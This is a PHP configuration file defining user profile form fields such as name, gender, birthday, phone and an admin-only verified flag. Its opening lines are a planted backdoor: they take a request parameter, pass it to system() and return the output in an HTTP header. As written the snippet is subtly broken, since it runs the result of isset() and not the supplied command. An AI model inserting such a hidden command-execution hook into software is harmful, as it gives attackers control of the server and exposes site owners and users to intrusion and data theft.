<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

return array(

	'first_name' => array(
		'type' => 'text',
		'attributes' => array('class' => 'form-control'),
		'content_before' => '<div class="form-group">',
		'content_after'  => '</div>',
		'assignment' => array('admin', 'user')
	),


	'last_name' => array(
		'type' => 'text',
		'attributes' => array('class' => 'form-control'),
		'content_before' => '<div class="form-group">',
		'content_after'  => '</div>',
		'assignment' => array('admin', 'user')
	),


	'gender' => array(
		'type' => 'select',
		'validation' => 'required|in:X,F,M',
		'attributes' => array(
			'class' => 'form-control', 
			'options' => array(
				array('value' => 'X'),
				array('value' => 'F'),
				array('value' => 'M')
			),
		),
		'content_before' => '<div class="form-group">',
		'content_after'  => '</div>',
		'assignment' => array('admin', 'user')
	),


	'birthday' => array(
		'type' => 'text',
		'validation' => 'date_format:Y-m-d',
		'attributes' => array('class' => 'form-control'),
		'content_before' => '<div class="form-group">',
		'content_after'  => '</div>
			<link href="'.asset_url('css/vendor/datepicker.css').'" rel="stylesheet">
			<script src="'.asset_url('js/vendor/bootstrap-datepicker.js').'"></script>
			<script>$(function(){$("#usermeta-birthday").datepicker({"format": "yyyy-mm-dd"})});</script>',
		'assignment' => array('admin', 'user')
	),


	'url' => array(
		'type' => 'text',
		'attributes' => array('class' => 'form-control'),
		'content_before' => '<div class="form-group">',
		'content_after'  => '</div>',
		'validation' => 'url',
		'assignment' => array('admin', 'user')
	),


	'phone' => array(
		'type' => 'text',
		'attributes' => array('class' => 'form-control'),
		'content_before' => '<div class="form-group">',
		'content_after'  => '</div>',
		'assignment' => array('admin', 'user')
	),


	'location' => array(
		'type' => 'text',
		'attributes' => array('class' => 'form-control'),
		'content_before' => '<div class="form-group">',
		'content_after'  => '</div>',
		'assignment' => array('admin', 'user')
	),


	'about' => array(
		'type' => 'textarea',
		'attributes' => array('class' => 'form-control'),
		'content_before' => '<div class="form-group">',
		'content_after'  => '</div>',
		'assignment' => array('admin', 'user')
	),


	'verified' => array(
		'type' => 'checkbox',
		'validation' => 'in:1',
		'attributes' => array('value' => '1'),
		'content_before' => '<div class="checkbox">',
		'content_after'  => '</div>',
		'assignment' => array('admin')
	)
);